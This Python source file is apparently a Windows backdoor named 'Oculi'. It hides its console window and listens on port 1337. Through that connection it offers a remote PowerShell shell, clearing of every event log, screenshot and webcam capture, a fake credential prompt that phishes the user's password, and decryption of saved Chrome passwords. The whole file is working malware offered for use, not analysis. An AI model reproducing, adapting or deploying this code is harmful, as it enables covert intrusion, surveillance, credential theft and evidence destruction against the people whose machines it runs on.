from colorama import init, Fore, Style, Back
init()
red = '\033[38;5;196m'
yellow = '\033[38;5;226m'
banner = rf'''{red}
     ▄██████▄   ▄████████ ███    █▄   ▄█        ▄█  {yellow}(v1.0){red}
    ███    ███ ███    ███ ███    ███ ███       ███  
    ███    ███ ███    █▀  ███    ███ ███       ███▌ 
    ███    ███ ███        ███    ███ ███       ███▌ 
    ███    ███ ███        ███    ███ ███       ███▌
    ███    ███ ███    █▄  ███    ███ ███       ███  
    ███    ███ ███    ███ ███    ███ ███▌    ▄ ███  
     ▀██████▀  ████████▀  ████████▀  █████▄▄██ █▀   
    ----------- {yellow}developed by spicesouls{red} -----------

''' + Style.RESET_ALL

import socket
import subprocess
import os
import sys
import json
import base64
import random
import win32api
import win32console
import win32gui
import win32crypt
import platform
import re
import pygame
import pygame.camera
import sqlite3
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import uuid
import getpass
import shutil
import psutil
PORT=1337

screenshotpscode = '''[Reflection.Assembly]::LoadWithPartialName("System.Drawing"); function screenshot([Drawing.Rectangle]$bounds, $path) {$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size); $bmp.Save($path); $graphics.Dispose(); $bmp.Dispose()}; $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, SYSTEMMETRICSONE, SYSTEMMETRICSTWO); screenshot $bounds "PATH2REPLACE"'''
phishpscode = '''while($true){$credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "");if($credential){$creds = $credential.GetNetworkCredential(); [String]$user = $creds.username; [String]$pass = $creds.password; Set-Content $env:temp\\fish.txt $user":"$pass; break}}'''

def hideconsole():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def startbackdoor():
    # Bind to Host & IP
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
                conn.send(bytes(banner,'utf-8'))
                while True:
                    conn.send(bytes(f'{yellow}{getpass.getuser()}{Fore.RESET}@{red}Oculi{Fore.RESET} {Style.BRIGHT}>>{Style.RESET_ALL} ','utf-8'))
                    instruction = conn.recv(4096).decode().strip()
                    if not instruction:
                        break
                    elif instruction == 'help':
                        conn.send(bytes(Style.BRIGHT + r'''
           HELP
          -====-''' + Style.RESET_ALL + r'''
       help ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Displays this message
      shell ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Drop into a Shell
     whoami ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Get Current User
    sysinfo ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Get System Info
        pid ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Get Process ID
     banner ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Display the banner
       ping ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Get the Network Ping Latency
   clearlog ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Wipe Windows Event Logs
 screenshot ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Take a Screenshot of the Main Display
     webcam ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Take a Photo through an availabe webcam
      phish ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Phish the user for their credentials
     chrome ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Steal Chrome Passwords
       exit ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Exit Oculi (Does not kill the program)
       kill ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Kill Oculi

''','utf-8'))
                    elif instruction == 'shell':
                        conn.send(bytes(Style.BRIGHT + "Type 'exit' to leave the shell.\n" + Style.RESET_ALL,'utf-8'))
                        while True:
                            pwd = bytes(os.getcwd(), 'utf-8')
                            conn.send(b'PS ' + pwd + b'> ')
                            data = conn.recv(4096)
                            if data.decode('utf-8')[:2] == 'cd':
                                os.chdir(data.decode('utf-8').replace('\n','')[3:])
                            elif data.decode().lower().strip() == 'exit':
                                break
                            else:
                                if data.decode().strip() != '':
                                    try:
                                        result = subprocess.getoutput('powershell.exe ' + data.decode().strip()) + '\n'
                                        conn.send(bytes(result,'utf-8'))
                                    except Exception as e:
                                        conn.send(bytes('Error: ' + str(e) + '\n','utf-8'))
                                else:
                                    pass
                    elif instruction == 'whoami': conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + subprocess.getoutput('whoami') + '\n','utf-8'))
                    elif instruction == 'sysinfo':
                        conn.send(bytes(rf'''{Style.BRIGHT}
  +---- System Info ----+{Style.RESET_ALL}
    System    {Style.BRIGHT}:{Style.RESET_ALL} {platform.system()}
    Version   {Style.BRIGHT}:{Style.RESET_ALL} {platform.version()}
    Arch      {Style.BRIGHT}:{Style.RESET_ALL} {platform.machine()}

    Hostname  {Style.BRIGHT}:{Style.RESET_ALL} {socket.gethostname()}
    IP        {Style.BRIGHT}:{Style.RESET_ALL} {socket.gethostbyname(socket.gethostname())}
    MAC       {Style.BRIGHT}:{Style.RESET_ALL} {':'.join(re.findall('..', '%012x' % uuid.getnode()))}

    Processor {Style.BRIGHT}:{Style.RESET_ALL} {platform.processor()}
    RAM       {Style.BRIGHT}:{Style.RESET_ALL} {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"} {Style.BRIGHT}
  +---------------------+{Style.RESET_ALL}

''','utf-8'))
                    elif instruction == 'pid': 
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'PID: {str(os.getpid())}\n','utf-8'))
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'PPID: {str(os.getppid())}\n','utf-8'))
                    elif instruction == 'banner': conn.send(bytes(banner,'utf-8'))
                    elif instruction == 'ping':
                        param = '-n' if platform.system().lower()=='windows' else '-c'
                        pingcommand = ['ping', param, '1', addr[0]]
                        pingresult = subprocess.check_output(pingcommand)
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Pinging Client IP...\n','utf-8'))
                        conn.send(pingresult + b'\n')
                    elif instruction == 'clearlog':
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Getting Event Logs...\n','utf-8'))
                        eventlogs = subprocess.getoutput('wevtutil el').split('\n')
                        conn.send(bytes(f'\tFound {Style.BRIGHT}{str(len(eventlogs))}{Style.RESET_ALL} Event Logs.\n','utf-8'))
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Clearing Windows Logs...\n','utf-8'))
                        subprocess.check_output(["powershell.exe", """wevtutil el | Foreach-Object {wevtutil cl "$_"}"""])
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Finished!\n','utf-8'))
                    elif instruction == 'screenshot':
                        scnpath = os.getenv('TEMP')
                        scnpath += '\cache.png'
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Path: ' + Style.BRIGHT + scnpath + Style.RESET_ALL + '\n', 'utf-8'))
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Executing Powershell...\n','utf-8'))
                        
                        subprocess.check_output(["powershell.exe", screenshotpscode.replace('PATH2REPLACE',scnpath).replace('SYSTEMMETRICSONE',str(win32api.GetSystemMetrics(0))).replace('SYSTEMMETRICSTWO',str(win32api.GetSystemMetrics(1)))])
                        conn.send(bytes(Fore.GREEN + '\n[+] ' + Fore.RESET + 'Success! Screenshot saved to ' + scnpath + '\n','utf-8'))
                    elif instruction == 'webcam':
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'Checking for Webcams...\n','utf-8'))
                        try:
                            pygame.camera.init()
                            cam = pygame.camera.Camera(0,(640,480))
                            cam.start()
                            conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'Getting Picture through Webcam...\n','utf-8'))
                            img = cam.get_image()
                            conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'Saving image to {os.getenv("TEMP")}\\webcam-cache.jpg ...\n','utf-8'))
                            pygame.image.save(img,os.getenv("TEMP") + "\\webcam-cache.jpg")
                            conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'Done! Closing Camera...\n','utf-8'))
                            cam.stop()
                        except Exception as e:
                            conn.send(bytes(Fore.RED + '[+] ' + Fore.RESET + f'Error finding/using a Webcam ({str(e)})\n','utf-8'))
                    elif instruction == 'phish':
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Starting Phishing Window, Waiting for Target Input...\n', 'utf-8'))
                        subprocess.getoutput(['powershell.exe', phishpscode])
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Checking For Phishing Results...\n', 'utf-8'))
                        try:
                            with open(os.getenv('TEMP') + '\\fish.txt','r') as o:
                                phishresults = o.read()
                                o.close()
                            conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Success! Phishing Results:\n\n', 'utf-8'))
                            conn.send(bytes(phishresults,'utf-8') + b'\n')
                        except:
                            conn.send(bytes(Fore.RED + '[+] ' + Fore.RESET + 'Failure, Results not found\n', 'utf-8'))
                    elif instruction == 'chrome':
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Attempting to Locate Chrome DB...\n','utf-8'))
                        chromelogins = []
                        def get_chrome_datetime(chromedate): return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                        def get_encryption_key():
                            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                            "AppData", "Local", "Google", "Chrome",
                                                            "User Data", "Local State")
                            with open(local_state_path, "r", encoding="utf-8") as f:
                                local_state = f.read()
                                local_state = json.loads(local_state)
                            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                            key = key[5:]
                            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                        def decrypt_password(password, key):
                            try:
                                iv = password[3:15]
                                password = password[15:]
                                cipher = AES.new(key, AES.MODE_GCM, iv)
                                return cipher.decrypt(password)[:-16].decode()
                            except:
                                try:
                                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                                except:
                                    return ""
                        key = get_encryption_key()
                        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                                "Google", "Chrome", "User Data", "default", "Login Data")
                        filename = "ChromeData.db"
                        shutil.copyfile(db_path, filename)
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + 'Reading Chrome DB...\n','utf-8'))
                        db = sqlite3.connect(filename)
                        cursor = db.cursor()
                        # `logins` table has the data we need
                        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                        for row in cursor.fetchall():
                            origin_url = row[0]
                            action_url = row[1]
                            username = row[2]
                            password = decrypt_password(row[3], key)   
                            if username or password: chromelogins.append({"origin":origin_url,"action":action_url,"username":username,"password":password})
                            else: continue
                        cursor.close(); db.close()
                        try: os.remove(filename)
                        except: pass
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'Done! {Style.BRIGHT}{str(len(chromelogins))}{Style.RESET_ALL} Logins Found\n','utf-8'))
                        with open(os.getenv('TEMP') + '\\chrome-cache.txt','w') as o:
                            for login in chromelogins:
                                o.write(f'''Created At: {login["origin"]}\nLogin Used At: {login["action"]}\nUsername: {login["username"]}\nPassword: {login["password"]}\n\n''')
                            o.close()
                        conn.send(bytes(Fore.GREEN + '[+] ' + Fore.RESET + f'Logins written to {os.getenv("TEMP")}\\chrome-cache.txt\n','utf-8'))
                    elif instruction == 'exit':
                        conn.send(b'\n  Bye Bye!\n')
                        conn.close()
                        break
                    elif instruction == 'kill':
                        conn.send(b'Are you sure you want to kill Oculi? [Y/N]\n > ')
                        confirmation = conn.recv(4096).decode().strip().upper()
                        if confirmation == 'Y':
                            conn.send(b'\n  Killing Oculi...\n')
                            conn.close()
                            sys.exit()
                    else: conn.send(bytes(Fore.RED + '[+] ' + Fore.RESET + 'Command not found.\n', 'utf-8'))

hideconsole()
startbackdoor()
